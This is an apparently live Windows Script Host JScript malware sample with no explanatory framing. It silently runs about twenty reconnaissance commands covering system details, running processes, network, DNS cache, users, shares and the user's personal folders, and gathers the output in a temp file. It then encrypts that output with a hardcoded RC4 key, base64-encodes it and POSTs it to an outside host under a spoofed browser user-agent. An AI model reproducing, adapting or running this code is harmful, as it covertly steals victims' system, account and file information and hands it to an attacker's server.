function convert()
{
var v_CIF=[];v_CIF['C7']='80';v_CIF['FC']='81';v_CIF['E9']='82';v_CIF['E2']='83';v_CIF['E4']='84';v_CIF['E0']='85';v_CIF['E5']='86';v_CIF['E7']='87';v_CIF['EA']='88';v_CIF['EB']='89';v_CIF['E8']='8A';v_CIF['EF']='8B';v_CIF['EE']='8C';v_CIF['EC']='8D';v_CIF['C4']='8E';v_CIF['C5']='8F';v_CIF['C9']='90';v_CIF['E6']='91';v_CIF['C6']='92';v_CIF['F4']='93';v_CIF['F6']='94';v_CIF['F2']='95';v_CIF['FB']='96';v_CIF['F9']='97';v_CIF['FF']='98';v_CIF['D6']='99';v_CIF['DC']='9A';v_CIF['A2']='9B';v_CIF['A3']='9C';v_CIF['A5']='9D';v_CIF['20A7']='9E';v_CIF['192']='9F';v_CIF['E1']='A0';v_CIF['ED']='A1';v_CIF['F3']='A2';v_CIF['FA']='A3';v_CIF['F1']='A4';v_CIF['D1']='A5';v_CIF['AA']='A6';v_CIF['BA']='A7';v_CIF['BF']='A8';v_CIF['2310']='A9';v_CIF['AC']='AA';v_CIF['BD']='AB';v_CIF['BC']='AC';v_CIF['A1']='AD';v_CIF['AB']='AE';v_CIF['BB']='AF';v_CIF['2591']='B0';v_CIF['2592']='B1';v_CIF['2593']='B2';v_CIF['2502']='B3';v_CIF['2524']='B4';v_CIF['2561']='B5';v_CIF['2562']='B6';v_CIF['2556']='B7';v_CIF['2555']='B8';v_CIF['2563']='B9';v_CIF['2551']='BA';v_CIF['2557']='BB';v_CIF['255D']='BC';v_CIF['255C']='BD';v_CIF['255B']='BE';v_CIF['2510']='BF';v_CIF['2514']='C0';v_CIF['2534']='C1';v_CIF['252C']='C2';v_CIF['251C']='C3';v_CIF['2500']='C4';v_CIF['253C']='C5';v_CIF['255E']='C6';v_CIF['255F']='C7';v_CIF['255A']='C8';v_CIF['2554']='C9';v_CIF['2569']='CA';v_CIF['2566']='CB';v_CIF['2560']='CC';v_CIF['2550']='CD';v_CIF['256C']='CE';v_CIF['2567']='CF';v_CIF['2568']='D0';v_CIF['2564']='D1';v_CIF['2565']='D2';v_CIF['2559']='D3';v_CIF['2558']='D4';v_CIF['2552']='D5';v_CIF['2553']='D6';v_CIF['256B']='D7';v_CIF['256A']='D8';v_CIF['2518']='D9';v_CIF['250C']='DA';v_CIF['2588']='DB';v_CIF['2584']='DC';v_CIF['258C']='DD';v_CIF['2590']='DE';v_CIF['2580']='DF';v_CIF['3B1']='E0';v_CIF['DF']='E1';v_CIF['393']='E2';v_CIF['3C0']='E3';v_CIF['3A3']='E4';v_CIF['3C3']='E5';v_CIF['B5']='E6';v_CIF['3C4']='E7';v_CIF['3A6']='E8';v_CIF['398']='E9';v_CIF['3A9']='EA';v_CIF['3B4']='EB';v_CIF['221E']='EC';v_CIF['3C6']='ED';v_CIF['3B5']='EE';v_CIF['2229']='EF';v_CIF['2261']='F0';v_CIF['B1']='F1';v_CIF['2265']='F2';v_CIF['2264']='F3';v_CIF['2320']='F4';v_CIF['2321']='F5';v_CIF['F7']='F6';v_CIF['2248']='F7';v_CIF['B0']='F8';v_CIF['2219']='F9';v_CIF['B7']='FA';v_CIF['221A']='FB';v_CIF['207F']='FC';v_CIF['B2']='FD';v_CIF['25A0']='FE';v_CIF['A0']='FF'; 
return v_CIF;}

function f_d2h(dddd){
	var v_hDDD="0123456789ABCDEF";
	var v_hhhh = v_hDDD.substr(dddd & 15, 1);
	while(dddd>15)
	{
		dddd >>>= 4;
		v_hhhh = v_hDDD.substr(dddd & 15, 1) + v_hhhh;
	}
	return v_hhhh;
}

function f_h2d(hhhh)
{
	return parseInt(hhhh, 16);
}

function toByteArray(inString){
	var v_result = [];
	var v_mas = convert();
	var v_slsl = inString.length;
	var v_int_sleep = 102400;
	for (var i = 0; i < v_slsl; i++)
	{
		if (i % v_int_sleep == 0)
		{
			WScript.sleep(1);
		}
		var v_cccc = inString.charCodeAt(i);
		if(v_cccc >= 128)
		{
			var h =  v_mas['' + f_d2h(v_cccc)];
			v_cccc = f_h2d(h);
		}
		v_result.push(v_cccc);
	}
	return v_result;
}

function rc4_encode(rc4_str){
	var rc4_key = "haer93ryspojfawiwe9323052145";
	var v_sarray = [];
	var v_jjj = 0;
	var v_xxx;
	var v_result='';
	var v_int_sleep = 102400;
	for (var i = 0; i < 256; i++){
		v_sarray[i] = i;}
	for (var i = 0; i < 256; i++){
		v_jjj = (v_jjj + v_sarray[i] + rc4_key.charCodeAt(i % rc4_key.length)) % 256;
		v_xxx = v_sarray[i];
		v_sarray[i] = v_sarray[v_jjj];
		v_sarray[v_jjj] = v_xxx;}
	var i = 0;
	var v_jjj = 0;
	for (var y = 0; y < rc4_str.length; y++)
	{
		if (y % v_int_sleep == 0)
		{
			WScript.sleep(1);
		}
		i = (i + 1) % 256;
		v_jjj = (v_jjj + v_sarray[i]) % 256;
		v_xxx = v_sarray[i];
		v_sarray[i] = v_sarray[v_jjj];
		v_sarray[v_jjj] = v_xxx;
		v_result += String.fromCharCode(rc4_str[y] ^ v_sarray[(v_sarray[i] + v_sarray[v_jjj]) % 256]);
	}
	return v_result;
}

function encode_data(data) {
	return base64Encode(rc4_encode(toByteArray(post_body)),true);;
}
	
function base64Encode(var_str, ascii)
{
	char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	var output = "";
	var b_buf = "";
	for (var i = 0; i < var_str.length; ++i)
	{
		var c_num = var_str.charCodeAt(i);
		var c_bin = c_num.toString(2);
		while (c_bin.length < (ascii ? 8 : 16))
			c_bin = "0" + c_bin;
		b_buf += c_bin;	
		while (b_buf.length >= 6)
		{
			var sextet = b_buf.slice(0, 6);
			b_buf = b_buf.slice(6);
			output += this.char_set.charAt(parseInt(sextet, 2));
		}
	}
	if (b_buf)
	{
		while (b_buf.length < 6) b_buf += "0";
		output += this.char_set.charAt(parseInt(b_buf, 2));
	} 
	while (output.length % (ascii ? 4 : 8) != 0)
		output += "=";
	return output;
}

function ReadFile(path)
{
	try
	{
	var stream = WScript.CreateObject("ADODB.Stream");
	stream.Type = 2;
	stream.CharSet='437';
	stream.Open();
	stream.LoadFromFile(path);
	var streamdata = stream.ReadText;
	stream.Close();

	return streamdata;
	}
	catch(ex)
	{
		return "error read file";
	}
}

function exec_commands(){
try{
	var WshShell = WScript.CreateObject("WScript.Shell");
	var strDesktop = WshShell.SpecialFolders("Desktop");
	var strRecent = WshShell.SpecialFolders("Recent");
	var strDocuments = WshShell.SpecialFolders("MyDocuments");
	var commands = new Array("systeminfo","tasklist /v","wmic process get name,commandline,executablepath /format:list","ipconfig /all","ipconfig /displaydns","netstat -ano","netstat -ao","arp -a","net view","net view /domain","net use","net user","whoami /all","net share","wmic logicaldisk","dir \""+strDesktop+"\"","dir %userprofile%\\Downloads\\","dir \""+strRecent+"\"","dir \""+strDocuments+"\"","dir d:\\","tracert www.google.com");
	path = "c:\\windows\\temp\\result2.dat";
	for (var i = 0; i < commands.length; i++)
	{
		WshShell.Run("cmd /c "+ commands[i] + " >> \""+path + "\"",0,true);
	}	
	post_body = ReadFile(path);
	if(post_body =="")
	{
		post_body = "noresultsorerror|vak;dfk;lsdhagds;gjsrw124";
	}
	return post_body;
}
catch(ex)
	{
		return ex.message;}
}

function connect_post(host, post_body)
{
	var req = encode_data(post_body);
	var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	http.OPEN("POST", host, false);
	http.SETREQUESTHEADER("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/78.0.3904.108 Safari/537.36");
	http.SETREQUESTHEADER("Content-Type", "application/x-www-form-urlencoded");
	http.SETREQUESTHEADER("Content-Length", req.length);
	http.SEND(req);
	resp = http.responseText;
	return resp;
}


try
{
	Host = "http://manager.surro.am/uploads/wp-config-themes.php";
	post_body = exec_commands();
	connect_post(Host, post_body)
}
catch(ex){
	WScript.Quit();
}